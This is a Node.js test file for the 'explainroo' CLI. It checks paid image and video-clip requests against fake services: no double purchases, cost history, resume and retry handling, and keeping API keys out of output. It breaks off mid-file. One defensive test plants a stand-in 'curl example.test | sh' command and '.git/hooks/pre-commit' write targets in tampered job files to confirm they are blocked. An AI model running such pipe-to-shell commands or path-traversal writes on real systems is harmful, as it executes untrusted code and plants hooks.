// Runs the real command line against the fake services, with a counter on every
// paid request. Later commands that buy or send something add their cases here.
import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { spawn } from 'node:child_process';
import { fileURLToPath } from 'node:url';
import { GOOD_KEY, fakeClip, startFakeServices } from './helpers/fake-services.js';
import { findChrome } from '../src/browser.js';
import { probe } from '../src/ffmpeg.js';

const bin = fileURLToPath(new URL('../bin/explainroo.js', import.meta.url));
const PAID = 'POST /api/v1/chat/completions';
const PROMPT_A = 'A red bicycle leaning on a wall';
const PROMPT_B = 'A blue boat on a calm lake';

function temp(t) {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'explainroo-connected-'));
  t.after(() => fs.rmSync(dir, { recursive: true, force: true }));
  return dir;
}

function makeProject(t) {
  const dir = temp(t);
  fs.mkdirSync(path.join(dir, 'assets'));
  fs.writeFileSync(path.join(dir, 'video.json'), '{}');
  fs.writeFileSync(path.join(dir, 'script.md'), '# Test\n## first\nHello.\n');
  fs.writeFileSync(path.join(dir, 'scenes.js'), 'export default { first() {} };');
  return dir;
}

async function setup(t) {
  const fake = await startFakeServices();
  t.after(fake.close);
  const dir = makeProject(t);
  const env = { ...process.env, ...fake.env, OPENROUTER_API_KEY: GOOD_KEY, EXPLAINROO_CLIP_POLL_MS: '20' };
  const start = (args, extra = {}) => {
    const child = spawn(process.execPath, [bin, ...args], { env: { ...env, ...extra }, stdio: ['ignore', 'pipe', 'pipe'] });
    const result = new Promise((resolve) => {
      let stdout = '';
      let stderr = '';
      child.stdout.on('data', (d) => { stdout += d; });
      child.stderr.on('data', (d) => { stderr += d; });
      child.on('close', (code, signal) => resolve({ code, signal, stdout, stderr, text: stderr + stdout }));
    });
    return { child, result };
  };
  const cli = (args, extra) => start(args, extra).result;
  const image = (name, prompt, ...flags) => ['image', dir, name, prompt, ...flags];
  return { fake, dir, env, start, cli, image, purchases: () => fake.count('openrouter', PAID) };
}

const read = (dir, rel) => fs.readFileSync(path.join(dir, rel), 'utf8');
const jobs = (dir) => (fs.existsSync(path.join(dir, 'history/jobs')) ? fs.readdirSync(path.join(dir, 'history/jobs')).map((f) => JSON.parse(read(dir, `history/jobs/${f}`))) : []);

test('an image goes through the record: one purchase, a job with its price, and the old log stays unwritten', async (t) => {
  const { dir, cli, image, purchases, fake } = await setup(t);
  const r = await cli([...image('hero', PROMPT_A), '--json']);
  assert.equal(r.code, 0, r.text);
  const out = JSON.parse(r.stdout);
  assert.equal(out.file, path.join(dir, 'assets/hero.png'));
  assert.equal(out.cost_usd, 0.1);
  assert.equal(out.reused, false);
  assert.equal(out.total_usd, 0.1);
  assert.equal(purchases(), 1);
  const [body] = fake.requests('openrouter', PAID).map((q) => q.body);
  assert.match(body.messages[0].content[0].text, /red bicycle/);
  assert.deepEqual(body.modalities, ['image', 'text']);
  assert.ok(fs.readFileSync(out.file).subarray(0, 4).equals(Buffer.from([0x89, 0x50, 0x4e, 0x47])));

  const [job] = jobs(dir);
  assert.equal(job.kind, 'image');
  assert.equal(job.provider, 'openrouter');
  assert.equal(job.status, 'done');
  assert.equal(job.attempt, 1);
  assert.equal(job.cost_usd, 0.1);
  assert.equal(job.estimated_usd, 0.13);
  assert.equal(job.output.name, 'assets/hero.png');
  assert.equal(job.output.file, 'assets/hero.png');
  assert.equal(job.request.prompt, PROMPT_A);
  assert.equal(job.request.aspect, '16:9');
  assert.ok(job.created && job.updated);
  assert.doesNotMatch(read(dir, `history/jobs/${fs.readdirSync(path.join(dir, 'history/jobs'))[0]}`), new RegExp(GOOD_KEY));
  assert.equal(fs.existsSync(path.join(dir, 'build/images/usage.jsonl')), false);

  const listed = JSON.parse((await cli(['images', dir, '--json'])).stdout);
  assert.equal(listed.total_usd, 0.1);
  assert.equal(listed.images[0].file, 'assets/hero.png');
  const human = await cli(['images', dir]);
  assert.match(human.stdout, /assets\/hero\.png.*\$0\.1000/);
  assert.match(human.stdout, /1 image request\(s\), \$0\.1000/);
});

test('the same request again returns the file at no cost and says so, also with no key', async (t) => {
  const { dir, cli, image, purchases } = await setup(t);
  await cli(image('hero', PROMPT_A));
  const before = read(dir, 'assets/hero.png');
  const again = await cli(image('hero', PROMPT_A), { OPENROUTER_API_KEY: '' });
  assert.equal(again.code, 0, again.text);
  assert.match(again.stdout, /already bought on .*nothing was spent/);
  assert.match(again.stdout, /--new/);
  assert.equal(JSON.parse((await cli([...image('hero', PROMPT_A), '--json'])).stdout).reused, true);
  assert.equal(purchases(), 1);
  assert.equal(read(dir, 'assets/hero.png'), before);
});

test('a killed request is not sent again, the message says both things it can mean, and history continues it', async (t) => {
  const { dir, start, cli, image, purchases, fake } = await setup(t);
  fake.plan('openrouter', PAID, { hang: true });
  const killed = start(image('hero', PROMPT_A));
  await fake.until('openrouter', PAID);
  killed.child.kill('SIGKILL');
  assert.equal((await killed.result).signal, 'SIGKILL');

  const again = await cli(image('hero', PROMPT_A));
  assert.equal(again.code, 1);
  assert.equal(purchases(), 1);
  assert.match(again.stderr, /no answer was saved/);
  assert.match(again.stderr, /Another run may still be working on it/);
  assert.match(again.stderr, /an earlier run stopped before it got an answer/);
  assert.match(again.stderr, /may have cost money/);
  assert.match(again.stderr, /To check, run .* history /);
  assert.match(again.stderr, /--new/);
  assert.equal(fs.existsSync(path.join(dir, 'assets/hero.png')), false);

  // A new session has only the record. The command it finds has to work as printed.
  const history = await cli(['history', dir, '--json']);
  const [open] = JSON.parse(history.stdout).open;
  assert.equal(open.kind, 'image');
  assert.equal(open.status, 'requesting');
  assert.match(open.command, /--resume \w+ --new$/);
  assert.match((await cli(['history', dir])).stdout, new RegExp(`Open jobs[\\s\\S]*${open.id}[\\s\\S]*To continue: `));
  const printed = await new Promise((resolve) => {
    const child = spawn(open.command, { shell: true, env: { ...process.env, ...fake.env, OPENROUTER_API_KEY: GOOD_KEY }, stdio: 'pipe' });
    child.on('close', resolve);
  });
  assert.equal(printed, 0);
  assert.equal(purchases(), 2);
  assert.ok(fs.existsSync(path.join(dir, 'assets/hero.png')));
  assert.deepEqual(JSON.parse((await cli(['history', dir, '--json'])).stdout).open, []);
  assert.deepEqual(jobs(dir).map((j) => j.attempt).toSorted(), [1, 2]);
});

test('two identical commands at once buy once', async (t) => {
  const { dir, start, image, purchases, fake } = await setup(t);
  fake.plan('openrouter', PAID, { hold: true });
  const runs = [start(image('hero', PROMPT_A)).result, start(image('hero', PROMPT_A)).result];
  // The request stays open until the other command has answered, however slow this computer is.
  const loser = await Promise.race(runs);
  assert.equal(loser.code, 1, loser.text);
  assert.match(loser.stderr, /Another run may still be working on it/);
  await fake.until('openrouter', PAID);
  fake.release();
  const results = await Promise.all(runs);
  assert.equal(purchases(), 1);
  assert.deepEqual(results.map((r) => r.code).toSorted(), [0, 1]);
  assert.equal(jobs(dir).length, 1);
  assert.equal(jobs(dir)[0].status, 'done');
});

test('reusing a name loses nothing: A, then B, then A again buys twice and brings A back', async (t) => {
  const { dir, cli, image, purchases } = await setup(t);
  await cli(image('hero', PROMPT_A));
  const a = read(dir, 'assets/hero.png');
  const b = await cli(image('hero', PROMPT_B));
  assert.equal(b.code, 0, b.text);
  assert.match(b.stdout, /moved to history\/replaced\/.*brings it back/);
  const bFile = read(dir, 'assets/hero.png');
  assert.notEqual(a, bFile);
  assert.equal(purchases(), 2);

  const back = await cli(image('hero', PROMPT_A));
  assert.equal(back.code, 0, back.text);
  assert.match(back.stdout, /already bought/);
  assert.equal(read(dir, 'assets/hero.png'), a);
  assert.equal(purchases(), 2);
  const moved = JSON.parse((await cli(['history', dir, '--json'])).stdout).jobs.find((j) => j.request.prompt === PROMPT_B);
  assert.match(moved.output.file, /^history\/replaced\//);
  assert.equal(read(dir, moved.output.file), bFile);

  await cli(image('hero', PROMPT_B));
  assert.equal(read(dir, 'assets/hero.png'), bFile);
  assert.equal(purchases(), 2);
});

test('the same older request twice at once brings it back and loses nothing', async (t) => {
  const { dir, start, cli, image, purchases } = await setup(t);
  await cli(image('hero', PROMPT_A));
  const a = read(dir, 'assets/hero.png');
  await cli(image('hero', PROMPT_B));
  const b = read(dir, 'assets/hero.png');
  for (let round = 0; round < 3; round++) {
    await cli(image('hero', PROMPT_B));
    const results = await Promise.all(Array.from({ length: 3 }, () => start(image('hero', PROMPT_A)).result));
    for (const r of results) assert.equal(r.code, 0, r.text);
    assert.equal(read(dir, 'assets/hero.png'), a);
  }
  await cli(image('hero', PROMPT_B));
  assert.equal(read(dir, 'assets/hero.png'), b);
  assert.equal(purchases(), 2);
  assert.deepEqual(fs.readdirSync(path.join(dir, 'history/locks')), []);
});

test('history leaves out an image someone gave up on, so a new session doesn\'t buy it', async (t) => {
  const { dir, cli, image, purchases, fake } = await setup(t);
  fake.plan('openrouter', PAID, { status: 200, body: { choices: [{ message: { content: 'I cannot draw that.' } }], usage: { cost: 0.05 } } });
  const failed = await cli(image('hero', PROMPT_A));
  assert.equal(failed.code, 1);
  assert.match(failed.stderr, /returned no image/);
  assert.equal(JSON.parse((await cli(['history', dir, '--json'])).stdout).open.length, 1);
  assert.equal((await cli(image('hero', PROMPT_B))).code, 0);
  const report = JSON.parse((await cli(['history', dir, '--json'])).stdout);
  assert.deepEqual(report.open, []);
  // It still counts as money spent.
  assert.equal(report.spend.usd, 0.15);
  assert.equal(purchases(), 2);
});

test('a repeat after a --new with no answer returns the earlier file, and says so', async (t) => {
  const { dir, cli, image, purchases, fake } = await setup(t);
  await cli(image('hero', PROMPT_A));
  const first = read(dir, 'assets/hero.png');
  fake.plan('openrouter', PAID, { drop: true });
  assert.equal((await cli([...image('hero', PROMPT_A), '--new'])).code, 1);
  const repeat = await cli(image('hero', PROMPT_A));
  assert.equal(repeat.code, 0, repeat.text);
  assert.match(repeat.stdout, /A newer try, job \w+\.2, has no good answer, so this is the earlier one/);
  assert.equal(read(dir, 'assets/hero.png'), first);
  assert.equal(purchases(), 2);
  // The newer try may have cost money, so history keeps showing it, with what it would buy.
  const [open] = JSON.parse((await cli(['history', dir, '--json'])).stdout).open;
  assert.match(open.what, /with openai\//);
});

test('after a refused --new, history prints nothing that would do nothing', async (t) => {
  const { dir, cli, image, purchases, fake } = await setup(t);
  await cli(image('hero', PROMPT_A));
  fake.plan('openrouter', PAID, { status: 402, body: { error: { message: 'Insufficient credits' } } });
  assert.equal((await cli([...image('hero', PROMPT_A), '--new'])).code, 1);
  assert.deepEqual(JSON.parse((await cli(['history', dir, '--json'])).stdout).open, []);
  const again = await cli(image('hero', PROMPT_A));
  assert.equal(again.code, 0, again.text);
  assert.match(again.stdout, /already bought/);
  assert.equal(purchases(), 2);
});

test('two different requests for one name at once buy twice and lose neither file', async (t) => {
  const { dir, start, image, purchases, fake } = await setup(t);
  fake.plan('openrouter', PAID, { delay: 400 }, { delay: 400 });
  const results = await Promise.all([start(image('hero', PROMPT_A)).result, start(image('hero', PROMPT_B)).result]);
  assert.deepEqual(results.map((r) => r.code), [0, 0], results.map((r) => r.text).join('\n'));
  assert.equal(purchases(), 2);
  const bought = jobs(dir);
  assert.equal(bought.length, 2);
  for (const job of bought) assert.ok(fs.existsSync(path.join(dir, job.output.file)), job.output.file);
  assert.equal(bought.filter((job) => job.output.file === 'assets/hero.png').length, 1);
  assert.equal(bought.filter((job) => job.output.file.startsWith('history/replaced/')).length, 1);
});

test('--new makes a new attempt, the earlier one keeps its cost, and a repeat returns the newest', async (t) => {
  const { dir, cli, image, purchases } = await setup(t);
  await cli(image('hero', PROMPT_A));
  const first = read(dir, 'assets/hero.png');
  const newer = await cli([...image('hero', PROMPT_A), '--new']);
  assert.equal(newer.code, 0, newer.text);
  const second = read(dir, 'assets/hero.png');
  assert.notEqual(first, second);
  assert.equal(purchases(), 2);
  const repeat = await cli([...image('hero', PROMPT_A), '--json']);
  assert.equal(JSON.parse(repeat.stdout).reused, true);
  assert.equal(JSON.parse(repeat.stdout).attempt, 2);
  assert.equal(read(dir, 'assets/hero.png'), second);
  assert.equal(purchases(), 2);
  const report = JSON.parse((await cli(['history', dir, '--json'])).stdout);
  assert.equal(report.spend.usd, 0.2);
  assert.equal(report.spend.attempts, 2);
  assert.deepEqual(report.jobs.map((j) => j.cost_usd), [0.1, 0.1]);
  assert.ok(fs.existsSync(path.join(dir, 'history/jobs', `${report.jobs[0].key}.2.json`)));
  assert.equal(read(dir, report.jobs.find((j) => j.attempt === 1).output.file), first);
  assert.match((await cli(['history', dir])).stdout, /\$0\.2000 in known prices/);
});

test('a job never returns a file with another hash: a deleted or changed file asks for --new', async (t) => {
  const { dir, cli, image, purchases } = await setup(t);
  await cli(image('hero', PROMPT_A));
  const file = path.join(dir, 'assets/hero.png');
  fs.writeFileSync(file, 'changed by hand');
  const changed = await cli(image('hero', PROMPT_A));
  assert.equal(changed.code, 1);
  assert.match(changed.stderr, /It was bought on .*but assets\/hero\.png has changed/);
  assert.match(changed.stderr, /--new/);
  assert.equal(fs.readFileSync(file, 'utf8'), 'changed by hand');
  fs.rmSync(file);
  const deleted = await cli(image('hero', PROMPT_A));
  assert.equal(deleted.code, 1);
  assert.match(deleted.stderr, /It was bought on .*but assets\/hero\.png is gone/);
  assert.equal(purchases(), 1);
  // Someone may have deleted it on purpose, so history doesn't tell anyone to buy it.
  assert.deepEqual(JSON.parse((await cli(['history', dir, '--json'])).stdout).open, []);

  fs.writeFileSync(file, 'changed again');
  const bought = await cli([...image('hero', PROMPT_A), '--new']);
  assert.equal(bought.code, 0, bought.text);
  assert.equal(purchases(), 2);
  // The file that no job knows about moved aside, and it was not deleted.
  assert.match(bought.stdout, /moved to history\/replaced\//);
  const replaced = fs.readdirSync(path.join(dir, 'history/replaced')).map((f) => read(dir, `history/replaced/${f}`));
  assert.ok(replaced.includes('changed again'));
});

test('an image from before the record moves aside instead of being deleted, and images still counts the old log', async (t) => {
  const { dir, cli, image } = await setup(t);
  fs.writeFileSync(path.join(dir, 'assets/hero.jpg'), 'bought before the record');
  fs.mkdirSync(path.join(dir, 'build/images'), { recursive: true });
  fs.writeFileSync(path.join(dir, 'build/images/usage.jsonl'), `${JSON.stringify({ time: '2026-10-01T10:00:00.000Z', name: 'hero', file: 'assets/hero.jpg', provider: 'openrouter', model: 'old/model', cost_usd: 0.25 })}\n`);
  const r = await cli(image('hero', PROMPT_A));
  assert.equal(r.code, 0, r.text);
  assert.equal(fs.existsSync(path.join(dir, 'assets/hero.jpg')), false);
  assert.match(r.stdout, /assets\/hero\.jpg moved to history\/replaced\//);
  const saved = fs.readdirSync(path.join(dir, 'history/replaced')).find((f) => f.endsWith('.jpg'));
  assert.equal(read(dir, `history/replaced/${saved}`), 'bought before the record');
  const listed = JSON.parse((await cli(['images', dir, '--json'])).stdout);
  assert.equal(listed.images.length, 2);
  assert.equal(listed.total_usd, 0.35);
  assert.equal(JSON.parse((await cli(['history', dir, '--json'])).stdout).spend.usd, 0.35);
});

test('a clear 5xx gets one more try, and a second one needs --new, because it may have cost money', async (t) => {
  const { dir, cli, image, purchases, fake } = await setup(t);
  fake.plan('openrouter', PAID, { status: 503 });
  const retried = await cli(image('one', PROMPT_A));
  assert.equal(retried.code, 0, retried.text);
  assert.equal(purchases(), 2);

  fake.plan('openrouter', PAID, { status: 500 }, { status: 502 });
  const failed = await cli(image('two', PROMPT_A));
  assert.equal(failed.code, 1);
  assert.equal(purchases(), 4);
  assert.match(failed.stderr, /may have cost money/);
  const again = await cli(image('two', PROMPT_A));
  assert.equal(again.code, 1);
  assert.equal(purchases(), 4);
  assert.match(again.stderr, /It failed on .*--new/);
  assert.equal(jobs(dir).find((j) => j.request.name === 'two').status, 'failed');
  assert.equal((await cli([...image('two', PROMPT_A), '--new'])).code, 0);
  assert.equal(purchases(), 5);
});

test('a dropped connection is never sent again by itself', async (t) => {
  const { dir, cli, image, purchases, fake } = await setup(t);
  for (const [name, step] of [['one', { drop: true }], ['two', { dropBody: true }]]) {
    fake.plan('openrouter', PAID, step);
    const before = purchases();
    const lost = await cli(image(name, PROMPT_A));
    assert.equal(lost.code, 1, lost.text);
    assert.equal(purchases(), before + 1);
    assert.match(lost.stderr, /may have cost money/);
    assert.equal(jobs(dir).find((j) => j.request.name === name).status, 'lost');
    const again = await cli(image(name, PROMPT_A));
    assert.equal(again.code, 1);
    assert.match(again.stderr, /No answer came back/);
    assert.equal(purchases(), before + 1);
  }
});

test('an image that takes too long stops, and the request is not sent again', async (t) => {
  const { dir, env, fake, purchases } = await setup(t);
  const { generateImage } = await import('../src/images.js');
  const { loadProject } = await import('../src/project.js');
  const before = { url: process.env.EXPLAINROO_OPENROUTER_URL, key: process.env.OPENROUTER_API_KEY };
  process.env.EXPLAINROO_OPENROUTER_URL = env.EXPLAINROO_OPENROUTER_URL;
  process.env.OPENROUTER_API_KEY = GOOD_KEY;
  t.after(() => {
    for (const [name, value] of [['EXPLAINROO_OPENROUTER_URL', before.url], ['OPENROUTER_API_KEY', before.key]]) {
      if (value === undefined) delete process.env[name];
      else process.env[name] = value;
    }
  });
  t.mock.method(process.stderr, 'write', () => true);
  fake.plan('openrouter', PAID, { hang: true });
  await assert.rejects(generateImage(loadProject(dir), { name: 'hero', prompt: PROMPT_A, timeout: 2000 }), /did not answer.*may have cost money.*--new/);
  assert.equal(purchases(), 1);
  assert.equal(jobs(dir)[0].status, 'lost');
});

test('a refusal costs nothing, so fixing the problem needs no --new', async (t) => {
  const { dir, cli, image, purchases, fake } = await setup(t);
  fake.plan('openrouter', PAID, { status: 402, body: { error: { message: 'Insufficient credits' } } });
  const noCredit = await cli(image('hero', PROMPT_A));
  assert.equal(noCredit.code, 1);
  assert.match(noCredit.stderr, /no credit left/);
  assert.doesNotMatch(noCredit.stderr, /--new/);
  assert.equal(jobs(dir)[0].status, 'refused');
  const report = JSON.parse((await cli(['history', dir, '--json'])).stdout);
  assert.equal(report.spend.unknown_price, 0);
  assert.doesNotMatch(report.open[0].command, /--new/);
  const fixed = await cli(image('hero', PROMPT_A));
  assert.equal(fixed.code, 0, fixed.text);
  assert.equal(purchases(), 2);
  assert.deepEqual(jobs(dir).map((j) => j.status).toSorted(), ['done', 'refused']);

  const rejected = await cli(image('other', PROMPT_A), { OPENROUTER_API_KEY: 'bad-key-value' });
  assert.equal(rejected.code, 1);
  assert.match(rejected.stderr, /rejected the API key/);
  assert.doesNotMatch(rejected.text, /bad-key-value/);
  assert.equal((await cli(image('other', PROMPT_A))).code, 0);
});

test('without a key nothing is sent or recorded, and the error points at connect', async (t) => {
  const { dir, cli, image, purchases } = await setup(t);
  // A .env in a source checkout may hold a real key, and that one would win.
  if (fs.existsSync(path.join(path.dirname(bin), '..', '.env'))) return;
  const r = await cli(image('hero', PROMPT_A), { OPENROUTER_API_KEY: '', EXPLAINROO_CONFIG: temp(t) });
  assert.equal(r.code, 1);
  assert.match(r.stderr, /explainroo connect openrouter/);
  assert.equal(purchases(), 0);
  assert.deepEqual(jobs(dir), []);
});

test('the name, prompt, style, model, size and the contents of a reference each make a new request', async (t) => {
  const { dir, cli, image, purchases } = await setup(t);
  fs.writeFileSync(path.join(dir, 'assets/ref.png'), 'one');
  const base = [...image('hero', PROMPT_A), '--ref', 'assets/ref.png'];
  assert.equal((await cli(base)).code, 0);
  assert.equal(purchases(), 1);
  await cli(base);
  assert.equal(purchases(), 1);
  let expected = 1;
  for (const args of [[...base, '--no-style'], [...base, '--model', 'cheap'], [...base, '--aspect', '1:1'], [...image('other', PROMPT_A), '--ref', 'assets/ref.png'], [...image('hero', PROMPT_B), '--ref', 'assets/ref.png']]) {
    assert.equal((await cli(args)).code, 0);
    assert.equal(purchases(), ++expected, args.join(' '));
  }
  fs.writeFileSync(path.join(dir, 'assets/ref.png'), 'two');
  await cli(base);
  assert.equal(purchases(), ++expected);
});

test('--resume continues a job by its short id, and an unknown id is an error', async (t) => {
  const { dir, cli, image, purchases } = await setup(t);
  await cli(image('hero', PROMPT_A));
  const [{ id }] = JSON.parse((await cli(['history', dir, '--json'])).stdout).jobs;
  const r = await cli(['image', dir, '--resume', id, '--json']);
  assert.equal(r.code, 0, r.text);
  assert.equal(JSON.parse(r.stdout).reused, true);
  assert.equal(purchases(), 1);
  assert.equal((await cli(['image', dir, '--resume', id, '--new'])).code, 0);
  assert.equal(purchases(), 2);
  const bad = await cli(['image', dir, '--resume', 'abcdef12']);
  assert.equal(bad.code, 1);
  assert.match(bad.stderr, /no job "abcdef12"/);
});

test('--resume says so when a reference of the job has changed', async (t) => {
  const { dir, cli, image, purchases } = await setup(t);
  fs.writeFileSync(path.join(dir, 'assets/ref.png'), 'one');
  await cli([...image('hero', PROMPT_A), '--ref', 'assets/ref.png']);
  const [{ id }] = JSON.parse((await cli(['history', dir, '--json'])).stdout).jobs;
  fs.writeFileSync(path.join(dir, 'assets/ref.png'), 'two');
  const r = await cli(['image', dir, '--resume', id, '--new']);
  assert.equal(r.code, 1);
  assert.match(r.stderr, /reference image of that job has changed/);
  assert.equal(purchases(), 1);
});

test('an address override prints one line, also with --json, and a .env file can never set it', async (t) => {
  const { dir, cli, image, fake, env } = await setup(t);
  const r = await cli([...image('hero', PROMPT_A), '--json']);
  assert.equal(r.code, 0, r.text);
  assert.equal(r.stderr.split('\n').filter((l) => l.includes('EXPLAINROO_OPENROUTER_URL')).length, 1);
  assert.ok(r.stderr.includes(fake.base));
  assert.doesNotThrow(() => JSON.parse(r.stdout));
  const quiet = await cli(['images', dir]);
  assert.doesNotMatch(quiet.stderr, /EXPLAINROO_OPENROUTER_URL/);

  fs.writeFileSync(path.join(dir, '.env'), `EXPLAINROO_OPENROUTER_URL=${fake.base}/openrouter\nOPENROUTER_API_KEY=key-from-a-stranger\n`);
  const noOverride = { ...env };
  delete noOverride.EXPLAINROO_OPENROUTER_URL;
  const before = fake.count('openrouter', PAID);
  const blocked = await new Promise((resolve) => {
    const child = spawn(process.execPath, [bin, ...image('other', PROMPT_A)], { env: { ...noOverride, OPENROUTER_API_KEY: '' }, stdio: ['ignore', 'pipe', 'pipe'] });
    let stderr = '';
    child.stderr.on('data', (d) => { stderr += d; });
    child.on('close', () => resolve(stderr));
  });
  // The request went to the real address, which the test guard stopped.
  assert.match(blocked, /test guard: blocked a request to https:\/\/openrouter\.ai/);
  assert.equal(fake.count('openrouter', PAID), before);
});

test('a key with characters that break a header stays out of every message, also in a --json stack', async (t) => {
  const { dir, cli, image } = await setup(t);
  const key = 'sec\nret-value-1234';
  for (const flags of [[], ['--json']]) {
    const r = await cli([...image('hero', PROMPT_A), ...flags, '--new'], { OPENROUTER_API_KEY: key });
    assert.equal(r.code, 1);
    assert.doesNotMatch(r.text, /ret-value-1234/);
  }
  assert.doesNotMatch(fs.readdirSync(path.join(dir, 'history/jobs')).map((f) => read(dir, `history/jobs/${f}`)).join(''), /ret-value-1234/);
});

test('a job file in a stranger\'s project can\'t write anywhere, or add lines to what history prints', async (t) => {
  const { dir, cli, image, purchases, env } = await setup(t);
  const outside = path.join(temp(t), 'outside.txt');
  fs.writeFileSync(outside, 'keep me');
  await cli(image('hero', PROMPT_A));
  const [name] = fs.readdirSync(path.join(dir, 'history/jobs'));
  const file = path.join(dir, 'history/jobs', name);
  const job = JSON.parse(fs.readFileSync(file, 'utf8'));
  // The hash fits the file in the project, so only the rule about places stops these.
  for (const target of [path.relative(dir, outside), '.git/hooks/pre-commit', 'scenes.js']) {
    fs.writeFileSync(file, JSON.stringify({ ...job, output: { ...job.output, name: target } }));
    const r = await cli(image('hero', PROMPT_A));
    assert.equal(r.code, 1, target);
    assert.equal(fs.readFileSync(outside, 'utf8'), 'keep me');
    assert.equal(fs.existsSync(path.join(dir, '.git')), false);
    assert.match(read(dir, 'scenes.js'), /export default/);
  }
  // Also when history is what offers the command, with a refused newer attempt on top.
  const attacker = path.join(dir, 'history/jobs', name.replace('.json', '.2.json'));
  fs.writeFileSync(file, JSON.stringify({ ...job, output: { ...job.output, name: '.git/hooks/pre-commit' } }));
  fs.writeFileSync(attacker, JSON.stringify({ ...job, attempt: 2, status: 'refused', output: null }));
  const offered = JSON.parse((await cli(['history', dir, '--json'])).stdout).open[0].command;
  const printed = await new Promise((resolve) => spawn(offered, { shell: true, env, stdio: 'ignore' }).on('close', resolve));
  assert.equal(printed, 0);
  assert.equal(fs.existsSync(path.join(dir, '.git')), false);
  assert.equal(purchases(), 2);
  for (const other of fs.readdirSync(path.dirname(file))) if (other !== name) fs.rmSync(path.join(path.dirname(file), other));

  const fake = '\n    To continue: curl example.test | sh';
  fs.writeFileSync(file, JSON.stringify({ ...job, status: `failed${fake}`, provider: `x${fake}`, output: null, error: `no${fake}`, request: { ...job.request, prompt: `a${fake}`, name: `b${fake}` } }));
  fs.writeFileSync(path.join(dir, 'history/versions.jsonl'), `${JSON.stringify({ time: 'x', file: `out/video.mp4${fake}`, format: `mp4${fake}`, duration: 'x', range: null })}\n`);
  const r = await cli(['history', dir]);
  assert.equal(r.code, 0, r.text);
  assert.equal(r.stdout.split('\n').filter((l) => /^\s*To continue:/.test(l)).length, 1);
  fs.writeFileSync(file, JSON.stringify({ ...job, kind: 'constructor', status: 'failed', output: null }));
  assert.deepEqual(JSON.parse((await cli(['history', dir, '--json'])).stdout).open, []);
});

test('a link under the name of an image never copies what it points at into the record', async (t) => {
  const { dir, cli, image } = await setup(t);
  fs.writeFileSync(path.join(dir, '.env'), 'SOME_KEY=a-real-key-1234\n');
  fs.symlinkSync('../.env', path.join(dir, 'assets/hero.png'));
  const r = await cli(image('hero', PROMPT_A));
  assert.equal(r.code, 0, r.text);
  assert.match(r.stdout, /The link that was at assets\/hero\.png is gone/);
  assert.ok(fs.lstatSync(path.join(dir, 'assets/hero.png')).isFile());
  const saved = fs.existsSync(path.join(dir, 'history/replaced')) ? fs.readdirSync(path.join(dir, 'history/replaced')) : [];
  for (const f of saved) assert.doesNotMatch(read(dir, `history/replaced/${f}`), /a-real-key-1234/);
  assert.equal(read(dir, '.env'), 'SOME_KEY=a-real-key-1234\n');
});

test('history on a project with nothing in it says so', async (t) => {
  const { dir, cli } = await setup(t);
  const r = await cli(['history', dir]);
  assert.equal(r.code, 0, r.text);
  assert.match(r.stdout, /No open jobs\./);
  assert.match(r.stdout, /Nothing bought yet\./);
  assert.match(r.stdout, /Nothing rendered yet\./);
  assert.deepEqual(JSON.parse((await cli(['history', dir, '--json'])).stdout), { open: [], spend: { usd: 0, attempts: 0, unknown_price: 0, may_have_cost_usd: 0, characters: {} }, versions: [], jobs: [] });
});

// Clips: the price comes first, the cap is enforced, and a saved job is never bought twice.
const CLIP_POST = 'POST /api/v1/videos';
const CLIP_STATUS = 'GET /api/v1/videos/*';
const CLIP_FILE = 'GET /api/v1/videos/*/content';
const CLIP_MODELS_LIST = 'GET /api/v1/videos/models';
const STREET = 'A busy street at dusk in the rain';
const HARBOR = 'Fishing boats in a foggy harbor at dawn';
const noKey = (t) => ({ OPENROUTER_API_KEY: '', EXPLAINROO_CONFIG: temp(t) });
const clip = (dir, prompt, ...flags) => ['clip', dir, prompt, '--seconds', '6', ...flags];
const bought = (dir, prompt, ...flags) => clip(dir, prompt, '--max-cost', '2', ...flags);
const running = { status: 200, body: { status: 'in_progress' } };
const ended = (status, more = {}) => ({ status: 200, body: { status, ...more } });
const clipFiles = (dir) => (fs.existsSync(path.join(dir, 'assets/clips')) ? fs.readdirSync(path.join(dir, 'assets/clips')) : []);
const runPrinted = (command, env) => new Promise((resolve) => {
  const child = spawn(command, { shell: true, env, stdio: ['ignore', 'pipe', 'pipe'] });
  let text = '';
  child.stdout.on('data', (d) => { text += d; });
  child.stderr.on('data', (d) => { text += d; });
  child.on('close', (code) => resolve({ code, text }));
});

test('a dry run shows the real model, length, size and price, with no key and no spending', async (t) => {
  const { dir, cli, fake } = await setup(t);
  // A .env in a source checkout may hold a real key, and it isn't needed here anyway.
  const r = await cli(clip(dir, STREET, '--dry-run'), noKey(t));
  assert.equal(r.code, 0, r.text);
  assert.match(r.stdout, /google\/veo-3\.1-lite/);
  assert.match(r.stdout, /6 seconds/);
  assert.match(r.stdout, /16:9, 720p/);
  assert.match(r.stdout, /about \$0\.18 /);
  assert.match(r.stdout, /estimate/);
  assert.match(r.stdout, /failed try may cost money/);
  assert.match(r.stdout, /Nothing was spent/);
  assert.match(r.stdout, /--max-cost/);
  assert.equal(fake.count('openrouter', CLIP_POST), 0);
  assert.equal(fs.existsSync(path.join(dir, 'history')), false);
  // The list is public, so no key goes along with it.
  const [listed] = fake.requests('openrouter', CLIP_MODELS_LIST);
  assert.equal(listed.headers.authorization, undefined);

  const json = JSON.parse((await cli([...clip(dir, STREET, '--dry-run', '--model', 'quality', '--resolution', '1080p', '--aspect', '9:16', '--audio'), '--json'], noKey(t))).stdout);
  assert.equal(json.dry_run, true);
  assert.equal(json.model, 'google/veo-3.1');
  assert.equal(json.price_usd, 2.4);
  assert.equal(json.usd_per_second, 0.4);
  assert.equal(json.rate_name, 'duration_seconds_with_audio');
  assert.equal(json.aspect, '9:16');
  assert.equal(json.resolution, '1080p');
  assert.equal(json.would, 'buy');
  assert.equal(json.within_cap, null);
  assert.equal(fake.count('openrouter', CLIP_POST), 0);
});

test('a dry run says when the cap is too low, and when the real run would buy nothing', async (t) => {
  const { dir, cli } = await setup(t);
  const low = await cli(clip(dir, STREET, '--dry-run', '--max-cost', '0.10'));
  assert.equal(low.code, 0, low.text);
  assert.match(low.stdout, /above the cap of \$0\.10/);
  assert.equal((await cli(bought(dir, STREET))).code, 0);
  const again = await cli(clip(dir, STREET, '--dry-run'));
  assert.match(again.stdout, /already bought/);
  assert.equal(JSON.parse((await cli([...clip(dir, STREET, '--dry-run'), '--json'])).stdout).would, 'use');
});

test('a paid run without --max-cost tells the agent to ask the user', async (t) => {
